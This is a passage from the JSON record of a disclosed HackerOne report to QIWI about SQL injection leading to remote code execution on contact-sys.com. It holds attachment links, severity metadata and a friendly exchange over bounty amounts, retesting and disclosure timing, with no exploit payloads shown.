qTnvJZaJWfp3F9jcm3FnwzYHZTcGXifg17Nbzb0roUgfsHPeorCwFQWH5sgSgHT2%2FWJtKCiy%2Bq70tsC4rbZb9rhONxp4U1mUQ1FHptDEi7qq4G0IX8as4zxX7lD6kdQWT5OzW%2B1QZT5nCSKbiYjBuLsBWu7yufMUkemOm2u4kDIOdccYg1ZGDofBPx4GFA%2B8IOAMP3e7bz6rUgxMr2NMjzX%2Byr%2FFaK2EDYbEgcI81le58BokeFu68wlopZbfnJvFia1ReCQe1Q%3D%3D\u0026X-Amz-Signature=deb1a69433212e056a43f9309d5a67dbc03542fd34f2f05032e8125b51742bba","file_size":60531,"type":"image/png"},{"id":743577,"file_name":"2020-03-10-sql-injection-to-rce.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vcmwzX9UBwB48mE1mxVLGTry?response-content-disposition=attachment%3B%20filename%3D%222020-03-10-sql-injection-to-rce.png%22%3B%20filename%2A%3DUTF-8%27%272020-03-10-sql-injection-to-rce.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZNBK7XE3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065736Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDJ7z4CmMY3RV8XLMfdiTISQ9S1r9LCcJaOgCsH72FPNAiEAuja%2BBBclEzFTidjiCeJDfo4MzChKrB6582xpvIRZVHkqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKF6a0ltLoRnSbls0yqRA3RGeXBNEYkcjQZeQFx3bgZwO3IO2Lrw6zpAqUNvB9kgtFfucTajkpiHPbxlEXUipMBgdqwocs7gTZt2N3PS5ofO0SiwdnSDzloAVKwvO0XxAw38SFZ70tsG2d%2FGMwjmhna0T8MpEDx2rGBrOrmMGD%2BxUltiSMg5RbP4rOtmNv8ar9c6C5QMOqO65NG11MRvC%2BWmpwVTu7rYIfx6VqNqNYuYBj3X8lrkAIj49fYyj6hO9J%2B192rAZcrZy%2Fw%2FVAObxfNeR4Ody9MGHCied9SDXd94Id6OVnLovmWuyeU9tqRxlCjsbK8JU%2BX4cPpzzLv2M%2BXo9FPZzDo%2BJsudoZ%2FGhP8gGO7tqmufjBlUJeCMc7PJwExjkANhZZ8jsuHUnG6x0ut5DHPqdKpuFrdIEEkM54WZUmpVWXhr4FFAQpHmxo5CDioZ8fJISU03lWiVZsNHNUNL9JvOP%2F9r%2BD39N6cKvQsPj88OjMOdSwqmXok7EmQpEHjQJD7E2qU3u9NYOegEnJbeEDovuNzvrAFxWCR8Jb54MPSEq%2F8FOusBO2kLVSIwkWtiWhkMaF2Er8oC8IS3vbK0bWd1vKM6%2B7NbNWRuqTnvJZaJWfp3F9jcm3FnwzYHZTcGXifg17Nbzb0roUgfsHPeorCwFQWH5sgSgHT2%2FWJtKCiy%2Bq70tsC4rbZb9rhONxp4U1mUQ1FHptDEi7qq4G0IX8as4zxX7lD6kdQWT5OzW%2B1QZT5nCSKbiYjBuLsBWu7yufMUkemOm2u4kDIOdccYg1ZGDofBPx4GFA%2B8IOAMP3e7bz6rUgxMr2NMjzX%2Byr%2FFaK2EDYbEgcI81le58BokeFu68wlopZbfnJvFia1ReCQe1Q%3D%3D\u0026X-Amz-Signature=6792444301e77936289b9062bd6b7203e2ea80959f0e39ac59d877e34e4f7786","file_size":85901,"type":"image/png"}],"allow_singular_disclosure_at":"2020-06-19T06:03:03.405Z","allow_singular_disclosure_after":-16678472.715282544,"singular_disclosure_allowed":true,"vote_count":440,"voters":["rootsploit","r3b00t_","thaivu","checkm50","jensec","sourc7","hackerontwowheels","t1g3rcat","secator","w31rd0","and 430 more..."],"severity":{"rating":"critical","score":10.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":18737,"asset_type":"URL","asset_identifier":"*.contact-sys.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7285813,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello.\n\nThank you for the report, we will look into it immediately.","markdown_message":"\u003cp\u003eHello.\u003c/p\u003e\n\n\u003cp\u003eThank you for the report, we will look into it immediately.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-11T06:09:15.266Z","updated_at":"2020-03-11T06:09:15.266Z","actor":{"username":"gmedian","cleared":false,"url":"/gmedian","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7340803,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for your help! We will pay you and addition $2100 bonus after replenish our account. Approximately in the beginning of next week.","markdown_message":"\u003cp\u003eThank you for your help! We will pay you and addition $2100 bonus after replenish our account. Approximately in the beginning of next week.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-17T08:22:42.253Z","updated_at":"2020-03-17T08:22:42.253Z","actor":{"url":"/qiwi","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"QIWI"}},"bounty_amount":"900.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"qiwi","collaborator":{"username":"honoki","url":"/honoki"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7341161,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @QIWI - thanks for the update. If I understand correctly, this means you will reward $5000 for the three SQL injections / RCE's combined?\n\nHowever, according to your bounty tables, and given that the vulnerable API appears to be part of your payment functionality, the rewards state $5000 for SQL injection / RCE. Could you please clarify the reasoning behind the lowered bounty for me?\n\nKind regards,\nPieter","markdown_message":"\u003cp\u003eHi \u003ca href=\"/qiwi\"\u003e@QIWI\u003c/a\u003e - thanks for the update. If I understand correctly, this means you will reward $5000 for the three SQL injections / RCE\u0026#39;s combined?\u003c/p\u003e\n\n\u003cp\u003eHowever, according to your bounty tables, and given that the vulnerable API appears to be part of your payment functionality, the rewards state $5000 for SQL injection / RCE. Could you please clarify the reasoning behind the lowered bounty for me?\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\nPieter\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-17T08:39:42.022Z","updated_at":"2020-03-17T08:39:42.022Z","actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7341279,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello.\n\nAs we have already mentioned - all the issues you reported actually happen to be a single bug. They all happen in a single place of software. But since we have triaged all the three reports we have decided to split up the bounty not to close other two as duplicates after triage. ","markdown_message":"\u003cp\u003eHello.\u003c/p\u003e\n\n\u003cp\u003eAs we have already mentioned - all the issues you reported actually happen to be a single bug. They all happen in a single place of software. But since we have triaged all the three reports we have decided to split up the bounty not to close other two as duplicates after triage. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-17T08:58:43.903Z","updated_at":"2020-03-17T08:58:43.903Z","actor":{"username":"gmedian","cleared":false,"url":"/gmedian","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7341354,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @gmedian - thanks for the quick response. When I read your comment on #816560, I agreed because I included 3 vulnerable payloads targetting the same query in one report (i.e. the actions `AddForBranch`, `AddForBank` and `AddForOffice` making use of the same underlying query): \n\n \u003e All these actions are executed in a single place. All the problems you specify have the very same root cause.\n\nWhereas if you now state that my three separate reports (this, #816560 and #816086) are duplicates, I'm afraid have to strongly disagree. I think based on the payloads and the error messages it is very clear that they are separate SQL injections targetting different underlying queries. The fact that I tested hundreds/thousands of entry points on the API and only found 3 vulnerable parameters indicates (in my opinion) that this isn't a single root cause, but rather three different vulnerabilities that should be separately resolved and rewarded.\n\nI would love to hear your reasoning, and would appreciate if you could reconsider your decision.\n\nKind regards,\nPieter","markdown_message":"\u003cp\u003eHi \u003ca href=\"/gmedian\"\u003e@gmedian\u003c/a\u003e - thanks for the quick response. When I read your comment on \u003ca href=\"/reports/816560\"\u003e#816560\u003c/a\u003e, I agreed because I included 3 vulnerable payloads targetting the same query in one report (i.e. the actions \u003ccode\u003eAddForBranch\u003c/code\u003e, \u003ccode\u003eAddForBank\u003c/code\u003e and \u003ccode\u003eAddForOffice\u003c/code\u003e making use of the same underlying query): \u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eAll these actions are executed in a single place. All the problems you specify have the very same root cause.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eWhereas if you now state that my three separate reports (this, \u003ca href=\"/reports/816560\"\u003e#816560\u003c/a\u003e and \u003ca href=\"/reports/816086\"\u003e#816086\u003c/a\u003e) are duplicates, I\u0026#39;m afraid have to strongly disagree. I think based on the payloads and the error messages it is very clear that they are separate SQL injections targetting different underlying queries. The fact that I tested hundreds/thousands of entry points on the API and only found 3 vulnerable parameters indicates (in my opinion) that this isn\u0026#39;t a single root cause, but rather three different vulnerabilities that should be separately resolved and rewarded.\u003c/p\u003e\n\n\u003cp\u003eI would love to hear your reasoning, and would appreciate if you could reconsider your decision.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\nPieter\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-17T09:07:06.574Z","updated_at":"2020-03-17T09:07:06.574Z","actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7341473,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @honoki - I do understtand that this might be frustarting, but they truly seem to have the same root cause. As far as I can see all the issues have already been dealt with with a single fix in the common query.\n\nYou might check them all again - we might have actually missed something - then we will look into the issue once more.\n\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/honoki\"\u003e@honoki\u003c/a\u003e - I do understtand that this might be frustarting, but they truly seem to have the same root cause. As far as I can see all the issues have already been dealt with with a single fix in the common query.\u003c/p\u003e\n\n\u003cp\u003eYou might check them all again - we might have actually missed something - then we will look into the issue once more.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-17T09:27:11.368Z","updated_at":"2020-03-17T09:27:11.368Z","actor":{"username":"gmedian","cleared":false,"url":"/gmedian","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7342467,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @gmedian - I appreciate your prompt responses. \n\nAs you suggested, I have retested the three vulnerabilities and found that two of the three appear to be successfully mitigated. I have placed a comment on #816560 where the vulnerability appears not to be fixed.","markdown_message":"\u003cp\u003eHello \u003ca href=\"/gmedian\"\u003e@gmedian\u003c/a\u003e - I appreciate your prompt responses. \u003c/p\u003e\n\n\u003cp\u003eAs you suggested, I have retested the three vulnerabilities and found that two of the three appear to be successfully mitigated. I have placed a comment on \u003ca href=\"/reports/816560\"\u003e#816560\u003c/a\u003e where the vulnerability appears not to be fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-17T11:34:04.427Z","updated_at":"2020-03-17T11:34:04.427Z","actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7408490,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for your help!\nAll three issues have been fixed, please recheck it. ","markdown_message":"\u003cp\u003eThanks again for your help!\u003cbr\u003e\nAll three issues have been fixed, please recheck it. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-24T10:43:49.831Z","updated_at":"2020-03-24T10:43:49.831Z","actor":{"url":"/qiwi","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"QIWI"}},"bounty_amount":"2100.0","bounty_currency":"usd","bonus_amount":"500.0","genius_execution_id":null,"team_handle":"qiwi","collaborator":{"username":"honoki","url":"/honoki"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7408557,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @qiwi @gmedian - thanks for the update. I'm still not clear on the bounty amounts. \n\nAs it stands, I believe we now established there were 2 separate root causes, as was demonstrated by the fact that the initial fix did not solve both issues.\n\nAltogether, you have now rewarded $5,500 for what I understand to be 2 critical SQL injections on your payment infrastructure.\n\nCould you please let me know what the rationale is behind the awards?\n\nMany thanks,\nPieter","markdown_message":"\u003cp\u003eHi \u003ca href=\"/qiwi\"\u003e@qiwi\u003c/a\u003e \u003ca href=\"/gmedian\"\u003e@gmedian\u003c/a\u003e - thanks for the update. I\u0026#39;m still not clear on the bounty amounts. \u003c/p\u003e\n\n\u003cp\u003eAs it stands, I believe we now established there were 2 separate root causes, as was demonstrated by the fact that the initial fix did not solve both issues.\u003c/p\u003e\n\n\u003cp\u003eAltogether, you have now rewarded $5,500 for what I understand to be 2 critical SQL injections on your payment infrastructure.\u003c/p\u003e\n\n\u003cp\u003eCould you please let me know what the rationale is behind the awards?\u003c/p\u003e\n\n\u003cp\u003eMany thanks,\u003cbr\u003e\nPieter\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-24T10:52:21.340Z","updated_at":"2020-03-24T10:52:21.340Z","actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7427544,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @honoki. Thank you for your comments, we really appreciate it.\nWe have decided to pay extra $2000 (so a grand total of $7500 for these 3 issues).\nThe main reason for the total amount is that all issues appeared in testing environment of the system (contactws.contact-sys.com) thus lowering the impact (compared to compromise of production servers).\n\nThank you very much for your help, we will be glad to receive new reports from you!\nIvan","markdown_message":"\u003cp\u003eHi \u003ca href=\"/honoki\"\u003e@honoki\u003c/a\u003e. Thank you for your comments, we really appreciate it.\u003cbr\u003e\nWe have decided to pay extra $2000 (so a grand total of $7500 for these 3 issues).\u003cbr\u003e\nThe main reason for the total amount is that all issues appeared in testing environment of the system (contactws.contact-sys.com) thus lowering the impact (compared to compromise of production servers).\u003c/p\u003e\n\n\u003cp\u003eThank you very much for your help, we will be glad to receive new reports from you!\u003cbr\u003e\nIvan\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-25T09:21:26.871Z","updated_at":"2020-03-25T09:21:26.871Z","actor":{"url":"/qiwi","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"QIWI"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"qiwi","collaborator":{"username":"honoki","url":"/honoki"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7427557,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-25T09:22:08.667Z","updated_at":"2020-03-25T09:22:08.667Z","actor":{"username":"vankyver","cleared":false,"url":"/vankyver","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"honoki","url":"/honoki"},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7427618,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @qiwi @vankyver - thanks for the clarification and the extra bounty. I appreciate you transparency and the final decision.\n\nKind regards,\nPieter","markdown_message":"\u003cp\u003eHi \u003ca href=\"/qiwi\"\u003e@qiwi\u003c/a\u003e \u003ca href=\"/vankyver\"\u003e@vankyver\u003c/a\u003e - thanks for the clarification and the extra bounty. I appreciate you transparency and the final decision.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\nPieter\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-25T09:24:30.377Z","updated_at":"2020-03-25T09:24:30.377Z","actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7428571,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Would like to disclose these reports, please.","markdown_message":"\u003cp\u003eWould like to disclose these reports, please.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-25T10:26:45.537Z","updated_at":"2020-03-25T10:26:45.537Z","first_to_agree":true,"actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7723627,"is_internal":false,"editable":false,"type":"Activities::CancelledDisclosureRequest","message":"Sorry, temporary cancel disclose request until final fix released. It will be really soon.","markdown_message":"\u003cp\u003eSorry, temporary cancel disclose request until final fix released. It will be really soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-20T11:36:39.404Z","updated_at":"2020-04-20T11:36:39.404Z","actor":{"username":"vankyver","cleared":false,"url":"/vankyver","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7725070,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I'm requesting disclosure again which you can accept at the appropriate time.\n\nKind regards,\nPieter","markdown_message":"\u003cp\u003eI\u0026#39;m requesting disclosure again which you can accept at the appropriate time.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\nPieter\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-20T13:06:21.733Z","updated_at":"2020-04-20T13:06:21.733Z","first_to_agree":true,"actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8052424,"is_internal":false,"editable":false,"type":"Activities::CancelledDisclosureRequest","message":"We need one or two more day to finally do release whole bunch of security fixes.","markdown_message":"\u003cp\u003eWe need one or two more day to finally do release whole bunch of security fixes.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-19T21:00:55.865Z","updated_at":"2020-05-19T21:00:55.865Z","actor":{"username":"vankyver","cleared":false,"url":"/vankyver","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8054672,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the update, @vankyver. I'm requesting disclosure again and will follow up at the end of the week.\n\nKind regards,\nPieter","markdown_message":"\u003cp\u003eThanks for the update, \u003ca href=\"/vankyver\"\u003e@vankyver\u003c/a\u003e. I\u0026#39;m requesting disclosure again and will follow up at the end of the week.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\nPieter\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-20T06:03:03.357Z","updated_at":"2020-05-20T06:03:03.357Z","first_to_agree":true,"actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8078449,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @vankyver - will you be able to disclose these reports today?","markdown_message":"\u003cp\u003eHello \u003ca href=\"/vankyver\"\u003e@vankyver\u003c/a\u003e - will you be able to disclose these reports today?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-22T10:02:34.441Z","updated_at":"2020-05-22T10:02:34.441Z","actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8119088,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vankyver - were you able to push the security fixes that will allow these to be published?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vankyver\"\u003e@vankyver\u003c/a\u003e - were you able to push the security fixes that will allow these to be published?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-27T13:36:26.516Z","updated_at":"2020-05-27T13:36:26.516Z","actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8338427,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-19T06:03:15.638Z","updated_at":"2020-06-19T06:03:15.638Z","actor":{"url":"/qiwi","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"QIWI"}},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}